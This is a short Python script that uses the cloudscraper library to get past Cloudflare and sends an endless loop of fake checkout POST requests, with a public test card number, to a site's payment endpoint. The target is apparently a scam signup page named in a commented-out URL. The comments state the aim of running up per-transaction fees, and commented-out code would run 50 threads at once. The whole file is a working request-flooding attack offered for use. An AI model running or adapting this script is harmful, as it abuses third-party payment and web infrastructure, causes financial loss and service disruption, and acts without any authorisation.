import cloudscraper

# This script essentially does a credit card transaction request to cloudfare which costs a few cents per transaction.
# So this will basically spam transactions and cost the spamming site money.
#
# The commented out code is to make it threadable. I haven't been able to figure out how to bypass the transaction wait
# time, so I've gone ahead and imported cloudscraper for now because I may be able to use that down the line
# but haven't been able to solve that problem with this module.
#
# The credit card info used is from ayden (https://docs.adyen.com/development-resources/test-cards/test-card-numbers)
# Thank you!

requestUrl = 'x'
#testurl = 'https://limitedsignupdeal.com/wi-w-v2/checkout/?ajax=1&token=b8c7a1ea44b0b019c26d5f43a7e20bee'
scraper = cloudscraper.create_scraper()

#Example data
data = {
    'action': 'checkout',
    'x_amount': '125.74',
    'x_transaction_id': '',
    'first_name': 'bob',
    'last_name': 'bob',
    'country': 'US',
    'zip': '12303',
    'address': '1259 Chrisler Ave',
    'address_2': '',
    'city': 'Schenectady',
    'state': 'NY',
    'phone': '(475) 849-5578',
    'email': 'yeet@gmail.com',
    'billingSameAsShipping': 'yes',
    'billing_state': 'AL',
    'ccnum': '4111 1111 1111 1111',
    'cvv': '123',
    'exp_month': '08',
    'exp_year': '22',
    'step2': '-1'
}


#def do_request():
while True:
    response = scraper.post(requestUrl, data=data).text
    print(response)


# threads = []
#
# for i in range(50):
#     t = threading.Thread(target=do_request)
#     t.daemon = True
#     threads.append(t)
#
# for i in range(50):
#     threads[i].start()
#
# for i in range(50):
#     threads[i].join()
